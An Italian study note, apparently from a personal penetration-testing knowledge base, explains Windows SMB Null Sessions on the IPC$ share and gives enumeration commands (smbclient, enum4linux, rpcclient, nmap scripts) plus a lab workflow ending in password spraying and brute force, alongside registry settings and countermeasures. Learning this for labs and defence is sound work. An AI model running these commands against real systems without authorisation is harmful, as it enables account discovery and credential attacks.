# Null Session

Tags: #networking #enumeration #smb #windows #hacking-exposed

---

## Cos'è

Una Null Session è una connessione alla share speciale **IPC$** di Windows usando **credenziali vuote** — username vuoto, password vuota. Permette di enumerare informazioni sensibili dal sistema senza autenticarsi.

```cmd
net use \\192.168.1.50\IPC$ "" /user:""
```

Il nome "null" viene proprio dalle credenziali nulle passate alla connessione.

---

## Perché esiste IPC$

`IPC$` (Inter-Process Communication) è una share nascosta presente su ogni sistema Windows. Non contiene file — espone **named pipes** per la comunicazione tra processi remoti via RPC (Remote Procedure Call).

Servizi Windows che usano IPC$:

- SAM (Security Account Manager) — database utenti locali
- LSA (Local Security Authority) — policy di sicurezza
- SRVSVC — informazioni sul server e share
- SVCCTL — gestione servizi remoti
- Winreg — registro di sistema remoto

Quando una Null Session ha successo, questi named pipes diventano accessibili senza credenziali.

---

## Cosa si può enumerare

Su sistemi vulnerabili (Windows NT/2000/XP/Server 2003) una Null Session espone:

|Informazione|Tool|
|---|---|
|Lista utenti e gruppi|`enum4linux`, `rpcclient`|
|Policy password (lunghezza min, scadenza...)|`enum4linux`|
|Share di rete disponibili|`smbclient`, `net view`|
|Informazioni sul dominio|`rpcclient`|
|SID del dominio|`rpcclient`|
|Sessioni attive|`netsess`|
|Trust tra domini|`rpcclient`|

---

## Workflow di attacco

### 1. Verifica connessione Null Session

```bash
# Da Linux
smbclient -L \\192.168.1.50 -N        # -N = no password
smbclient \\\\192.168.1.50\\IPC$ -N

# Da Windows
net use \\192.168.1.50\IPC$ "" /user:""
```

Output positivo:

```
Sharename    Type    Comment
---------    ----    -------
IPC$         IPC     Remote IPC
ADMIN$       Disk    Remote Admin
C$           Disk    Default share
files        Disk    Company files
```

### 2. Enumerazione con enum4linux

```bash
# Enumerazione completa
enum4linux -a 192.168.1.50

# Solo utenti
enum4linux -U 192.168.1.50

# Solo gruppi
enum4linux -G 192.168.1.50

# Solo share
enum4linux -S 192.168.1.50

# Policy password
enum4linux -P 192.168.1.50

# Informazioni OS
enum4linux -o 192.168.1.50
```

### 3. Enumerazione manuale con rpcclient

```bash
# Connessione null session
rpcclient -U "" -N 192.168.1.50

# Comandi dentro rpcclient:
rpcclient $> enumdomusers          # lista tutti gli utenti
rpcclient $> enumdomgroups         # lista tutti i gruppi
rpcclient $> querydominfo          # info sul dominio
rpcclient $> getdompwinfo          # policy password
rpcclient $> netshareenum          # share disponibili
rpcclient $> lsaquery              # info LSA
rpcclient $> lookupnames admin     # SID di un utente specifico
```

### Esempio output enumdomusers

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[john] rid:[0x3e8]
user:[mary] rid:[0x3e9]
user:[serviceaccount] rid:[0x3ea]
```

Lista completa di utenti → base per attacchi a password successivi.

---

## Null Session e Nmap NSE

```bash
# Verifica se null session è possibile
nmap --script smb-security-mode -p 445 192.168.1.50

# Enumerazione share via null session
nmap --script smb-enum-shares -p 445 192.168.1.50

# Enumerazione utenti
nmap --script smb-enum-users -p 445 192.168.1.50

# Tutto insieme
nmap --script smb-enum-shares,smb-enum-users,smb-security-mode -p 139,445 192.168.1.50
```

---

## Sistemi vulnerabili

|Sistema|Null Session|
|---|---|
|Windows NT 4.0|✅ Abilitata di default|
|Windows 2000|✅ Abilitata di default|
|Windows XP|✅ Parzialmente (dipende da config)|
|Windows Server 2003|⚠️ Limitata ma possibile|
|Windows Vista/7/Server 2008+|❌ Bloccata di default|
|Windows 10/11/Server 2019+|❌ Bloccata|

> Su HTB trovi spesso macchine Windows XP/Server 2003 — la Null Session è quasi sempre il primo passo.

---

## Registro di sistema — chiavi rilevanti

Il comportamento della Null Session è controllato da queste chiavi:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa

RestrictAnonymous
  0 = Null session permessa (default su NT/2000)
  1 = Null session permessa ma enumerazione limitata
  2 = Null session completamente bloccata (default su Vista+)

RestrictAnonymousSAM
  0 = SAM enumerabile via null session
  1 = SAM non enumerabile (default su XP+)
```

```cmd
# Verifica da Windows
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RestrictAnonymous
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RestrictAnonymousSAM
```

---

## Null Session vs Account Guest

Concetti distinti ma spesso confusi:

||Null Session|Account Guest|
|---|---|---|
|Credenziali|Username e password vuoti|Username "Guest", password vuota|
|Protocollo|SMB/IPC$|SMB standard|
|Scopo|Enumerazione via named pipes|Accesso a share condivise|
|Controllato da|`RestrictAnonymous`|Account Guest abilitato/disabilitato|
|Pericolosità|Alta — espone struttura sistema|Media — accesso file|

---

## Workflow completo su HTB

```
1. nmap -sV -p 139,445 <target>
              ↓
2. smbclient -L \\<target> -N     → share visibili?
              ↓
3. enum4linux -a <target>         → utenti, gruppi, policy
              ↓
4. rpcclient -U "" -N <target>    → enumerazione manuale
              ↓
5. Lista utenti ottenuta
              ↓
6. Password spray / brute force con credenziali trovate
              ↓
7. smbclient \\\\<target>\\share -U john  → accesso autenticato
```

---

## Contromisure

|Contromisura|Come applicarla|
|---|---|
|`RestrictAnonymous = 2`|Group Policy o registro|
|`RestrictAnonymousSAM = 1`|Group Policy o registro|
|Disabilitare NetBT|Rimuove TCP 139 dalla superficie|
|Firewall su TCP 139/445|Blocca accesso esterno|
|SMB signing obbligatorio|Previene SMB relay collegati|
|Aggiornare sistemi legacy|Eliminare Windows XP/2003 dalla rete|

---

## Riferimenti

- _Hacking Exposed 7_ — Cap. Enumeration
- Microsoft KB: RestrictAnonymous registry key
- `man enum4linux`
- `man rpcclient`
- `man smbclient`
- → vedi anche: [[NetBIOS_NBSS]] (TCP 139)
- → vedi anche: [[NetBT]]
- → vedi anche: [[NetBIOS_NBNS]] (UDP 137)